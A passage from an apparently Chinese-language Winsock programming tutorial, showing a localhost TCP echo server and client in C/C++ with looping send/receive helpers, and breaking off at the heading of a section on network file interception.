&#125;;<span class="comment">//存储时间</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//1 创建socket</span></span><br><span class="line">    SOCKET  sockServ = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);<span class="comment">//tcp ipv4</span></span><br><span class="line">    <span class="keyword">if</span> (INVALID_SOCKET == sockServ)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;Server socket errno: %d\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="comment">//errno：10093【应用程序没有调用 WSAStartup，或者 WSAStartup 失败。 】</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//2 bind参数</span></span><br><span class="line">    SOCKADDR_IN addrServ, addrClient;</span><br><span class="line">    <span class="type">int</span> szAddrCnt = <span class="built_in">sizeof</span>(addrClient);</span><br><span class="line"></span><br><span class="line">    addrServ.sin_family = PF_INET;</span><br><span class="line">    addrServ.sin_addr.S_un.S_addr = <span class="built_in">htonl</span>(INADDR_ANY);</span><br><span class="line">    addrServ.sin_port = <span class="built_in">htons</span>(<span class="number">6000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">bind</span>(sockServ, (sockaddr*)&amp;addrServ, <span class="built_in">sizeof</span>(addrServ)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;bind ERRORNO = %d\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3 监听</span></span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">listen</span>(sockServ, <span class="number">5</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;listen ERRORNO = %d\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//4 accpet 分配一台分机处理客户端连接【回声服务器】</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Wait ACCEPT:\n&quot;</span>);</span><br><span class="line">        SOCKET sockCnt = <span class="built_in">accept</span>(sockServ, (sockaddr*)&amp;addrClient, &amp;szAddrCnt);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//5 收发数据</span></span><br><span class="line">        <span class="type">int</span> ret = <span class="built_in">MySocketRecv0</span>(sockCnt, message, <span class="built_in">sizeof</span>(message) - <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Message from client: ,ret = %d\n&quot;</span>, ret);</span><br><span class="line">        <span class="comment">//回声</span></span><br><span class="line">        ret = <span class="built_in">MySocketSend0</span>(sockCnt, (<span class="type">unsigned</span> <span class="type">char</span>*)message, <span class="built_in">strlen</span>(message));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Message to client: ,ret = %d\n\n&quot;</span>, ret);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//6 关闭分机</span></span><br><span class="line">        <span class="built_in">closesocket</span>(sockCnt);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//7 关闭总机</span></span><br><span class="line">    <span class="built_in">closesocket</span>(sockServ);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//循环接受超大数据</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">MySocketRecv0</span><span class="params">(<span class="type">int</span> sock, <span class="type">char</span>* buf, <span class="type">int</span> dataSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> numsRecvSoFar = <span class="number">0</span>;<span class="comment">//目前收到</span></span><br><span class="line">    <span class="type">int</span> numsRemainingToRecv = dataSize;<span class="comment">//待接受大小</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;MySocketRecv0\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> bytesRead = <span class="built_in">recv</span>(sock, buf + numsRecvSoFar, numsRemainingToRecv, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;###bytesRead = %d,numsRecvSoFar = %d, numsRemainingToRecv = %d\n&quot;</span>, bytesRead, numsRecvSoFar, numsRemainingToRecv);</span><br><span class="line">        <span class="keyword">if</span> (bytesRead == numsRemainingToRecv)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//一次读完</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (bytesRead &gt; <span class="number">0</span>)<span class="comment">//需要继续读</span></span><br><span class="line">        &#123;</span><br><span class="line">            numsRecvSoFar += bytesRead;</span><br><span class="line">            numsRemainingToRecv -= bytesRead;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (bytesRead &lt; <span class="number">0</span> &amp;&amp; errno == EAGAIN)<span class="comment">//11//发生错误或网络断开</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span><span class="comment">//其他返回</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//循环发送超大数据</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">MySocketSend0</span><span class="params">(<span class="type">int</span> socketNum, <span class="type">unsigned</span> <span class="type">char</span>* data, <span class="type">unsigned</span> dataSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> numBytesSentSoFar = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> numBytesRemainingToSend = dataSize;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> bytesSend = <span class="built_in">send</span>(socketNum, (<span class="type">char</span> <span class="type">const</span>*)(&amp;data[numBytesSentSoFar]), numBytesRemainingToSend, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (bytesSend == numBytesRemainingToSend)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (bytesSend &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            numBytesSentSoFar += bytesSend;</span><br><span class="line">            numBytesRemainingToSend -= bytesSend;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (bytesSend &lt; <span class="number">0</span> &amp;&amp; errno == <span class="number">11</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getCurrentTimeStr</span><span class="params">(<span class="type">char</span>* strtime)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 基于当前系统的当前日期/时间</span></span><br><span class="line">    <span class="type">time_t</span> now = <span class="built_in">time</span>(<span class="literal">NULL</span>);</span><br><span class="line">    tm* ltm = <span class="built_in">localtime</span>(&amp;now);</span><br><span class="line">    <span class="built_in">sprintf</span>(strtime, <span class="string">&quot;%2d:%2d:%2d&quot;</span>, ltm-&gt;tm_hour, ltm-&gt;tm_min, ltm-&gt;tm_sec);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHandling</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fputs</span>(message, stderr);</span><br><span class="line">    <span class="built_in">fputc</span>(<span class="string">&#x27;\n&#x27;</span>, stderr);</span><br><span class="line">    <span class="type">char</span> ch[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">getCurrentTimeStr</span>(ch);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;error num = %d, error time %s\n&quot;</span>, ::<span class="built_in">GetLastError</span>(), ch);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>📋基于<code>3.4.1</code>修改后的客户端：</p><ul><li>新增解决报错 <code>C4996</code>：<code>#pragma warning(disable:4996)</code>【详见第九章】</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span><span class="comment">//getCurrentTimeStr</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ARRAYSIZE (1024*1024*10)</span></span><br><span class="line"><span class="type">char</span> message[MAX_ARRAYSIZE];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ClientConnect</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">MySocketRecv0</span><span class="params">(<span class="type">int</span> sock, <span class="type">char</span>* buf, <span class="type">int</span> dateSize)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">MySocketSend0</span><span class="params">(<span class="type">int</span> socketNum, <span class="type">unsigned</span> <span class="type">char</span>* data, <span class="type">unsigned</span> dataSize)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHandling</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getCurrentTimeStr</span><span class="params">(<span class="type">char</span>* strtime)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">initArray</span><span class="params">(<span class="type">char</span> c)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">ClientConnect</span>();</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ClientConnect</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;TCP Client\n&quot;</span>);</span><br><span class="line">    <span class="comment">//0 初始化网络库</span></span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="comment">/* 进一步简化</span></span><br><span class="line"><span class="comment">    WORD wVersionRequested;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    wVersionRequested = MAKEWORD(1, 1);</span></span><br><span class="line"><span class="comment">    // 初始化套接字库</span></span><br><span class="line"><span class="comment">    if (WSAStartup(wVersionRequested, &amp;wsaData) != 0)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        ErrorHandling(&quot;WSAStartup() error!&quot;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">1</span>, <span class="number">1</span>), &amp;wsaData) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;WSAStartup() error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">LOBYTE</span>(wsaData.wVersion) != <span class="number">1</span> || <span class="built_in">HIBYTE</span>(wsaData.wVersion) != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">WSACleanup</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> ch[<span class="number">64</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//存储时间</span></span><br><span class="line">    <span class="built_in">initArray</span>(<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1 初始化套接字</span></span><br><span class="line">    SOCKET  hsock = <span class="built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="number">0</span>);<span class="comment">//tcp ipv4</span></span><br><span class="line">    <span class="keyword">if</span> (hsock == INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;Server socket errno: %d\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">getCurrentTimeStr</span>(ch);<span class="comment">//将当前时间存入ch</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;begin connect %s\n&quot;</span>, ch);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2 connect 配置要连接的服务器</span></span><br><span class="line">    SOCKADDR_IN addrServ;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;addrServ, <span class="number">0</span>, <span class="built_in">sizeof</span>(addrServ));</span><br><span class="line">    <span class="type">int</span> szAddrCnt = <span class="built_in">sizeof</span>(addrServ);</span><br><span class="line"></span><br><span class="line">    addrServ.sin_family = AF_INET;</span><br><span class="line">    addrServ.sin_addr.S_un.S_addr = <span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    addrServ.sin_port = <span class="built_in">htons</span>(<span class="number">6000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3 连接服务器</span></span><br><span class="line">    <span class="keyword">if</span> (SOCKET_ERROR == <span class="built_in">connect</span>(hsock, (sockaddr*)&amp;addrServ, <span class="built_in">sizeof</span>(addrServ)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;connect ERROR\n&quot;</span>);</span><br><span class="line">        <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);<span class="comment">//退出前等待</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">getCurrentTimeStr</span>(ch);<span class="comment">//将当前时间存入ch</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;after connect %s\n&quot;</span>, ch);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//4 收发数据</span></span><br><span class="line">    <span class="type">int</span> strLen = <span class="built_in">send</span>(hsock, message, <span class="built_in">strlen</span>(message) - <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;after send %d\n&quot;</span>, strLen);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ret = <span class="built_in">MySocketRecv0</span>(hsock, message, <span class="built_in">strlen</span>(message) - <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Message from server: ,ret = %d\n&quot;</span>, ret);</span><br><span class="line">    <span class="keyword">if</span> (strLen == <span class="number">-1</span>)</span><br><span class="line">        <span class="built_in">ErrorHandling</span>(<span class="string">&quot;read() error!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">getCurrentTimeStr</span>(ch);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;after recv %s\n&quot;</span>, ch);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//5 关闭套接字</span></span><br><span class="line">    <span class="built_in">closesocket</span>(hsock);</span><br><span class="line">    <span class="comment">//6 终止套接字</span></span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//循环接受超大数据</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">MySocketRecv0</span><span class="params">(<span class="type">int</span> sock, <span class="type">char</span>* buf, <span class="type">int</span> dataSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> numsRecvSoFar = <span class="number">0</span>;<span class="comment">//目前收到</span></span><br><span class="line">    <span class="type">int</span> numsRemainingToRecv = dataSize;<span class="comment">//待接受大小</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;MySocketRecv0\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> bytesRead = <span class="built_in">recv</span>(sock, buf + numsRecvSoFar, numsRemainingToRecv, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;###bytesRead = %d,numsRecvSoFar = %d, numsRemainingToRecv = %d\n&quot;</span>, bytesRead, numsRecvSoFar, numsRemainingToRecv);</span><br><span class="line">        <span class="keyword">if</span> (bytesRead == numsRemainingToRecv)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//一次读完</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (bytesRead &gt; <span class="number">0</span>)<span class="comment">//需要继续读</span></span><br><span class="line">        &#123;</span><br><span class="line">            numsRecvSoFar += bytesRead;</span><br><span class="line">            numsRemainingToRecv -= bytesRead;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (bytesRead &lt; <span class="number">0</span> &amp;&amp; errno == EAGAIN)<span class="comment">//11//发生错误或网络断开</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span><span class="comment">//其他返回</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//循环发送超大数据</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">MySocketSend0</span><span class="params">(<span class="type">int</span> socketNum, <span class="type">unsigned</span> <span class="type">char</span>* data, <span class="type">unsigned</span> dataSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> numBytesSentSoFar = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> numBytesRemainingToSend = dataSize;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> bytesSend = <span class="built_in">send</span>(socketNum, (<span class="type">char</span> <span class="type">const</span>*)(&amp;data[numBytesSentSoFar]), numBytesRemainingToSend, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (bytesSend == numBytesRemainingToSend)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (bytesSend &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            numBytesSentSoFar += bytesSend;</span><br><span class="line">            numBytesRemainingToSend -= bytesSend;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (bytesSend &lt; <span class="number">0</span> &amp;&amp; errno == <span class="number">11</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)<span class="comment">//为避免下面的报错</span></span></span><br><span class="line"><span class="comment">//rror C4996: &#x27;localtime&#x27;: This function or variable may be unsafe. Consider using localtime_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online help for details.</span></span><br><span class="line"><span class="comment">//error C4996: &#x27;sprintf&#x27;: This function or variable may be unsafe. Consider using sprintf_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online help for details.</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getCurrentTimeStr</span><span class="params">(<span class="type">char</span>* strtime)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 基于当前系统的当前日期/时间</span></span><br><span class="line">    <span class="type">time_t</span> now = <span class="built_in">time</span>(<span class="literal">NULL</span>);</span><br><span class="line">    tm* ltm = <span class="built_in">localtime</span>(&amp;now);</span><br><span class="line">    <span class="built_in">sprintf</span>(strtime, <span class="string">&quot;%2d:%2d:%2d&quot;</span>, ltm-&gt;tm_hour, ltm-&gt;tm_min, ltm-&gt;tm_sec);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ErrorHandling</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fputs</span>(message, stderr);</span><br><span class="line">    <span class="built_in">fputc</span>(<span class="string">&#x27;\n&#x27;</span>, stderr);</span><br><span class="line">    <span class="type">char</span> ch[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">getCurrentTimeStr</span>(ch);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;error num = %d, error time %s\n&quot;</span>, ::<span class="built_in">GetLastError</span>(), ch);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">initArray</span><span class="params">(<span class="type">char</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX_ARRAYSIZE; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        message[i] = c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h2 id="五-网络编程实战"><a href="#五-网络编程实战" class="headerlink" title="五 网络编程实战"></a>五 网络编程实战</h2><h3 id="5-1-网络编程实战之网络文件截取"><a href="#5-1-网络编程实战之网络文件截取" class="headerlink" title="5.1 网络编程实战之网络文件截取"></a>5.1 网络编程实战之网络文件截取</h3><p><img src="./5-1.png"></p><p>Windows文件结构体：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 